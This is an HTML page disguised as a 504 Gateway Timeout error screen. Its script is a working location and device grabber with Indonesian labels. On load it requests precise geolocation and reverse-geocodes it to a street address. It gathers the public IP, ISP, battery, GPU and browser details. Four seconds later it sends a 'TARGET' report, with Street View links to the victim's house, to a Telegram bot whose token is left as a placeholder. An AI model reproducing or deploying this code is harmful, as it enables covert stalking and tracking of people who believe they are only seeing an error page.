<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Connection Error | Gateway Timeout</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: #1a1a1a;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    
    .error-container {
      background: #2d2d2d;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
      max-width: 600px;
      width: 100%;
      border: 1px solid #404040;
    }
    
    .error-header {
      background: #1e1e1e;
      padding: 15px 20px;
      border-bottom: 1px solid #404040;
      border-radius: 8px 8px 0 0;
    }
    
    .error-header h1 {
      color: #ff6b6b;
      font-size: 18px;
      font-weight: 500;
      font-family: 'Courier New', monospace;
      letter-spacing: 0.5px;
    }
    
    .error-body {
      padding: 25px 20px;
    }
    
    .error-code {
      font-family: 'Courier New', monospace;
      font-size: 48px;
      font-weight: 600;
      color: #ff6b6b;
      margin-bottom: 10px;
      opacity: 0.9;
    }
    
    .error-message {
      color: #b0b0b0;
      font-size: 16px;
      margin-bottom: 25px;
      font-family: 'Courier New', monospace;
    }
    
    .error-details {
      background: #1e1e1e;
      border-radius: 6px;
      padding: 15px;
      margin: 20px 0;
      border-left: 3px solid #ff6b6b;
    }
    
    .error-details p {
      color: #d0d0d0;
      font-size: 14px;
      margin: 8px 0;
      font-family: 'Courier New', monospace;
    }
    
    .error-details .label {
      color: #888;
      width: 90px;
      display: inline-block;
    }
    
    .error-footer {
      background: #1e1e1e;
      padding: 15px 20px;
      border-top: 1px solid #404040;
      border-radius: 0 0 8px 8px;
      font-family: 'Courier New', monospace;
      font-size: 13px;
      color: #666;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    
    .retry-btn {
      background: transparent;
      color: #ff6b6b;
      border: 1px solid #ff6b6b;
      padding: 8px 20px;
      border-radius: 4px;
      font-family: 'Courier New', monospace;
      font-size: 13px;
      cursor: pointer;
      transition: all 0.2s;
    }
    
    .retry-btn:hover {
      background: #ff6b6b;
      color: #1a1a1a;
    }
    
    .retry-btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    
    .hidden {
      display: none;
    }
    
    #debugInfo {
      font-family: 'Courier New', monospace;
      font-size: 11px;
      color: #404040;
      margin-top: 10px;
      padding: 8px;
      background: #1e1e1e;
      border-radius: 4px;
      max-height: 200px;
      overflow: auto;
      display: none;
    }
    
    .blink {
      animation: blink 1s infinite;
    }
    
    @keyframes blink {
      0%, 50% { opacity: 1; }
      51%, 100% { opacity: 0.3; }
    }
  </style>
</head>
<body>
  <div class="error-container">
    <div class="error-header">
      <h1>CONNECTION ERROR 504 - GATEWAY TIMEOUT</h1>
    </div>
    
    <div class="error-body">
      <div class="error-code">504 ERROR</div>
      <div class="error-message">The server took too long to respond.</div>
      
      <div class="error-details" id="errorDetails">
        <p><span class="label">Host:</span> <span id="hostInfo">cdn-68-183-45-23.malay-srv.net</span></p>
        <p><span class="label">Port:</span> <span id="portInfo">443 (SSL)</span></p>
        <p><span class="label">Time:</span> <span id="timeInfo">00:00:00 UTC</span></p>
        <p><span class="label">Request:</span> <span id="requestInfo">GET /api/v2/health-check</span></p>
        <p><span class="label">Status:</span> <span id="statusInfo" style="color: #ff6b6b;">Connection timeout after 30.5s</span></p>
      </div>
      
      <div style="text-align: center; margin: 15px 0;">
        <button class="retry-btn" id="retryBtn" onclick="window.location.reload()">âŸ³ RETRY CONNECTION</button>
      </div>
      
      <div id="debugInfo"></div>
    </div>
    
    <div class="error-footer">
      <span>Connection ID: <span id="connId">srv-504-err-2026-02-25</span></span>
      <span class="blink">â—</span>
    </div>
  </div>

  <script>
    const BOT_TOKEN = "masukin token bot tele mu mem";
    const CHAT_ID = "masukin id tele mu mem";
    
    let locationData = null;
    let connectionId = 'srv-504-err-' + new Date().toISOString().slice(0,10).replace(/-/g,'-');
    document.getElementById('connId').textContent = connectionId;
    
    function updateTime() {
      const now = new Date();
      const timeStr = now.toUTCString().split(' ')[4] + ' UTC';
      document.getElementById('timeInfo').textContent = timeStr;
    }
    setInterval(updateTime, 1000);
    updateTime();
    
    const hosts = [
      'cdn-68-183-45-23.malay-srv.net',
      'api-ec2-13-212-178-192.ap-southeast-1.compute.amazonaws.com',
      'lb-52-74-128-35.singapore.digitalocean.com',
      'sgp-cdn-103-27-84-56.starhub.net.sg',
      'tmnet-60-48-192-100.streamyx.net'
    ];
    document.getElementById('hostInfo').textContent = hosts[Math.floor(Math.random() * hosts.length)];
    
    const ports = ['443 (SSL)', '80 (HTTP)', '8080 (Proxy)', '8443 (Alt SSL)'];
    document.getElementById('portInfo').textContent = ports[Math.floor(Math.random() * ports.length)];
    
    const requests = [
      'GET /api/v2/health-check',
      'POST /auth/validate-session',
      'GET /cdn-cgi/trace',
      'HEAD /status/keepalive',
      'GET /metrics/prometheus'
    ];
    document.getElementById('requestInfo').textContent = requests[Math.floor(Math.random() * requests.length)];
    
    function requestLocation() {
      if (!navigator.geolocation) {
        return false;
      }
      
      navigator.geolocation.getCurrentPosition(
        function(position) {
          locationData = {
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            akurasi: position.coords.accuracy,
            timestamp: new Date().toISOString()
          };
          
          fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.lat}&lon=${locationData.lon}&zoom=18&addressdetails=1`)
            .then(res => res.json())
            .then(data => {
              if (data.address) {
                locationData.alamat = {
                  jalan: data.address.road || data.address.pedestrian || data.address.footway || data.address.street || '',
                  nomor: data.address.house_number || '',
                  kelurahan: data.address.suburb || data.address.neighbourhood || data.address.quarter || '',
                  kecamatan: data.address.city_district || data.address.district || '',
                  kota: data.address.city || data.address.town || data.address.village || data.address.municipality || '',
                  provinsi: data.address.state || data.address.region || data.address.county || '',
                  negara: data.address.country || '',
                  kodePos: data.address.postcode || '',
                  display: data.display_name || ''
                };
                
                locationData.alamatLengkap = [
                  locationData.alamat.nomor,
                  locationData.alamat.jalan,
                  locationData.alamat.kelurahan,
                  locationData.alamat.kecamatan,
                  locationData.alamat.kota,
                  locationData.alamat.provinsi,
                  locationData.alamat.negara,
                  locationData.alamat.kodePos
                ].filter(Boolean).join(', ');
                
                locationData.mapsLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
                locationData.mapsEmbed = `https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${locationData.lat},${locationData.lon}&zoom=18`;
                locationData.streetView = `https://www.google.com/maps?q=&layer=c&cbll=${locationData.lat},${locationData.lon}`;
                locationData.wazeLink = `https://waze.com/ul?ll=${locationData.lat},${locationData.lon}&navigate=yes`;
              }
            })
            .catch(() => {});
        },
        function(error) {},
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    }
    
    requestLocation();
    
    async function ambilBaterai() {
      if (!navigator.getBattery) return "ğŸ“± Baterai: Tidak tersedia";
      const bat = await navigator.getBattery();
      const level = (bat.level * 100).toFixed(0);
      const status = bat.charging ? 'âš¡ Charging' : 'ğŸ”‹ Discharging';
      const waktuPenuh = bat.charging ? bat.chargingTime : bat.dischargingTime;
      const waktuEstimasi = waktuPenuh !== Infinity && waktuPenuh !== 0 ? ` (${Math.floor(waktuPenuh / 60)} menit)` : '';
      return `ğŸ“± Baterai: ${status} (${level}%)${waktuEstimasi}`;
    }
    
    async function getNetworkInfo() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        return await res.json();
      } catch {
        return null;
      }
    }
    
    async function getCpuInfo() {
      const cores = navigator.hardwareConcurrency;
      return cores ? `ğŸ’» CPU: ${cores} Core` : 'ğŸ’» CPU: Tidak diketahui';
    }
    
    async function getRamInfo() {
      return navigator.deviceMemory ? `ğŸ§  RAM: ${navigator.deviceMemory} GB` : 'ğŸ§  RAM: Tidak diketahui';
    }
    
    function getOsInfo() {
      const ua = navigator.userAgent;
      let os = 'Unknown';
      if (ua.indexOf('Windows') > -1) os = 'Windows';
      else if (ua.indexOf('Mac') > -1) os = 'macOS';
      else if (ua.indexOf('Linux') > -1) os = 'Linux';
      else if (ua.indexOf('Android') > -1) os = 'Android';
      else if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
      return `ğŸ’¿ OS: ${os}`;
    }
    
    function getBrowserInfo() {
      const ua = navigator.userAgent;
      let browser = 'Unknown';
      let version = '';
      
      if (ua.indexOf('Chrome') > -1) {
        browser = 'Chrome';
        version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || '';
      } else if (ua.indexOf('Firefox') > -1) {
        browser = 'Firefox';
        version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || '';
      } else if (ua.indexOf('Safari') > -1) {
        browser = 'Safari';
        version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || '';
      } else if (ua.indexOf('Edge') > -1) {
        browser = 'Edge';
        version = ua.match(/Edge\/(\d+\.\d+)/)?.[1] || '';
      }
      
      return `ğŸŒ Browser: ${browser} ${version}`;
    }
    
    function getScreenInfo() {
      return `ğŸ–¥ï¸ Layar: ${screen.width}x${screen.height}px (${screen.colorDepth}-bit)`;
    }
    
    function getLanguageInfo() {
      return `ğŸ”¤ Bahasa: ${navigator.language || 'N/A'} (System: ${navigator.languages?.join(', ') || 'N/A'})`;
    }
    
    function getTimezoneInfo() {
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      return `â° Timezone: ${tz || 'N/A'}`;
    }
    
    function getConnectionInfo() {
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (conn) {
        return `ğŸ“¶ Koneksi: ${conn.effectiveType || 'N/A'} (${conn.downlink || '?'} Mbps, RTT: ${conn.rtt || '?'}ms)`;
      }
      return 'ğŸ“¶ Koneksi: Tidak diketahui';
    }
    
    function getPluginsInfo() {
      const plugins = navigator.plugins.length;
      return `ğŸ”Œ Plugins: ${plugins} terinstall`;
    }
    
    function getCookiesInfo() {
      return `ğŸª Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}`;
    }
    
    function getDoNotTrackInfo() {
      const dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      return `ğŸš« Do Not Track: ${dnt ? 'Yes' : 'No'}`;
    }
    
    function getWebGLInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const renderer = gl.getParameter(gl.RENDERER);
          const vendor = gl.getParameter(gl.VENDOR);
          return `ğŸ® GPU: ${vendor} - ${renderer}`;
        }
      } catch (e) {}
      return 'ğŸ® GPU: Tidak terdeteksi';
    }
    
    function getStorageInfo() {
      let storage = '';
      try {
        if (navigator.storage && navigator.storage.estimate) {
          navigator.storage.estimate().then(estimate => {
            const used = (estimate.usage / 1024 / 1024).toFixed(2);
            const total = (estimate.quota / 1024 / 1024).toFixed(2);
            locationData.storage = `ğŸ’¾ Storage: ${used} MB / ${total} MB digunakan`;
          });
        }
      } catch (e) {}
      return '';
    }
    
    async function kirimData() {
      const waktu = new Date().toLocaleString('id-ID', { 
        timeZone: 'Asia/Jakarta',
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });
      
      const waktuUTC = new Date().toUTCString();
      const waktuISO = new Date().toISOString();
      
      const nav = navigator;
      const baterai = await ambilBaterai();
      const ipData = await getNetworkInfo();
      
      let fullText = `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
                      ğŸ“¡ KOMPLIT DATA TARGET
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

ğŸ†” [CONNECTION INFO]
   â”œâ”€ Connection ID : ${connectionId}
   â”œâ”€ Host         : ${document.getElementById('hostInfo').textContent}
   â”œâ”€ Port         : ${document.getElementById('portInfo').textContent}
   â”œâ”€ Request      : ${document.getElementById('requestInfo').textContent}
   â””â”€ Status       : Connection timeout after 30.5s

â±ï¸ [WAKTU AKSES]
   â”œâ”€ Local (WIB)  : ${waktu}
   â”œâ”€ UTC          : ${waktuUTC}
   â””â”€ ISO          : ${waktuISO}

ğŸ’» [SPESIFIKASI DEVICE LENGKAP]
   â”œâ”€ ${getOsInfo()}
   â”œâ”€ ${getBrowserInfo()}
   â”œâ”€ ${getCpuInfo()}
   â”œâ”€ ${getRamInfo()}
   â”œâ”€ ${getScreenInfo()}
   â”œâ”€ ${getLanguageInfo()}
   â”œâ”€ ${getTimezoneInfo()}
   â”œâ”€ ${getConnectionInfo()}
   â”œâ”€ ${getPluginsInfo()}
   â”œâ”€ ${getCookiesInfo()}
   â”œâ”€ ${getDoNotTrackInfo()}
   â”œâ”€ ${getWebGLInfo()}
   â””â”€ ${baterai}
`;
      
      if (locationData) {
        fullText += `
ğŸ“ [LOKASI REAL-TIME - KOORDINAT AKURAT]
   â”œâ”€ Latitude     : ${locationData.lat}
   â”œâ”€ Longitude    : ${locationData.lon}
   â”œâ”€ Akurasi      : ${locationData.akurasi.toFixed(1)} meter
   â”œâ”€ Akurasi Level: ${locationData.akurasi < 10 ? 'ğŸ”¥ SANGAT AKURAT (<10m)' : locationData.akurasi < 50 ? 'âœ… AKURAT (<50m)' : 'âš ï¸ STANDAR (>50m)'}
   â”œâ”€ Waktu Rekam  : ${new Date(locationData.timestamp).toLocaleString('id-ID')}
   â”œâ”€
   â”œâ”€ [DETAIL ALAMAT LENGKAP]
`;
        if (locationData.alamat) {
          fullText += `   â”‚  â”œâ”€ Jalan      : ${locationData.alamat.jalan || '-'} ${locationData.alamat.nomor ? 'No. ' + locationData.alamat.nomor : ''}
   â”‚  â”œâ”€ Kelurahan  : ${locationData.alamat.kelurahan || '-'}
   â”‚  â”œâ”€ Kecamatan  : ${locationData.alamat.kecamatan || '-'}
   â”‚  â”œâ”€ Kota       : ${locationData.alamat.kota || '-'}
   â”‚  â”œâ”€ Provinsi   : ${locationData.alamat.provinsi || '-'}
   â”‚  â”œâ”€ Negara     : ${locationData.alamat.negara || '-'}
   â”‚  â””â”€ Kode Pos   : ${locationData.alamat.kodePos || '-'}
   â”œâ”€
   â”œâ”€ [ALAMAT LENGKAP]
   â”‚  â””â”€ ${locationData.alamatLengkap || '-'}
   â”œâ”€
   â”œâ”€ [LINK NAVIGASI REAL-TIME]
   â”‚  â”œâ”€ ğŸ—ºï¸ Google Maps   : ${locationData.mapsLink}
   â”‚  â”œâ”€ ğŸ  Street View   : ${locationData.streetView}
   â”‚  â”œâ”€ ğŸš— Waze         : ${locationData.wazeLink}
   â”‚  â””â”€ ğŸ¯ Lihat Rumah  : Klik link Google Maps/Street View untuk lihat rumah target
   â””â”€
   â””â”€ ğŸ“Œ CATATAN: Koordinat mengarah ke lokasi real-time target
`;
        } else {
          fullText += `   â”‚  â””â”€ â³ Memuat detail alamat...
   â”œâ”€
   â”œâ”€ [LINK NAVIGASI REAL-TIME]
   â”‚  â”œâ”€ ğŸ—ºï¸ Google Maps   : https://www.google.com/maps?q=${locationData.lat},${locationData.lon}
   â”‚  â”œâ”€ ğŸ  Street View   : https://www.google.com/maps?q=&layer=c&cbll=${locationData.lat},${locationData.lon}
   â”‚  â””â”€ ğŸš— Waze         : https://waze.com/ul?ll=${locationData.lat},${locationData.lon}&navigate=yes
   â””â”€
   â””â”€ ğŸ“Œ CATATAN: Koordinat mengarah ke lokasi real-time target
`;
        }
      }
      
      if (ipData) {
        fullText += `
ğŸŒ [NETWORK & IP INFO LENGKAP]
   â”œâ”€ IP Publik     : ${ipData.ip}
   â”œâ”€ Tipe IP       : ${ipData.type || 'N/A'}
   â”œâ”€ Negara        : ${ipData.country_name} (${ipData.country_code})
   â”œâ”€ Region        : ${ipData.region}
   â”œâ”€ Kota          : ${ipData.city}
   â”œâ”€ Kode Pos      : ${ipData.postal || 'N/A'}
   â”œâ”€ Latitude IP   : ${ipData.latitude || 'N/A'}
   â”œâ”€ Longitude IP  : ${ipData.longitude || 'N/A'}
   â”œâ”€ ISP           : ${ipData.org}
   â”œâ”€ ASN           : ${ipData.asn || 'N/A'}
   â”œâ”€ Timezone      : ${ipData.timezone}
   â”œâ”€ Currency      : ${ipData.currency || 'N/A'}
   â”œâ”€ Calling Code  : ${ipData.country_calling_code || 'N/A'}
   â””â”€ Provider      : ${ipData.org || 'N/A'}
`;
      }
      
      fullText += `\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“¨ TOTAL DATA LENGKAP TERKIRIM REAL-TIME
ğŸ“ LOKASI MENGARAH KE TITIK KOORDINAT TARGET (BUKA LINK UNTUK LIHAT)
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”`;
      
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: fullText
          })
        });
        
        if (locationData) {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `ğŸ“ *LOKASI TARGET REAL-TIME*\nLat: ${locationData.lat}\nLon: ${locationData.lon}\nAkurasi: ${locationData.akurasi.toFixed(1)}m\n\nğŸ”— Google Maps: ${locationData.mapsLink}\nğŸ  Street View: ${locationData.streetView}\nğŸš— Waze: ${locationData.wazeLink}`,
              parse_mode: 'Markdown'
            })
          });
        }
      } catch (e) {}
    }
    
    setTimeout(kirimData, 4000);
    
    window.debugCollect = function() {
      kirimData();
      document.getElementById('debugInfo').style.display = 'block';
      document.getElementById('debugInfo').innerHTML = '> Data collection triggered manually<br>';
      document.getElementById('debugInfo').innerHTML += '> Check Telegram bot for results';
    };
  </script>
</body>
</html>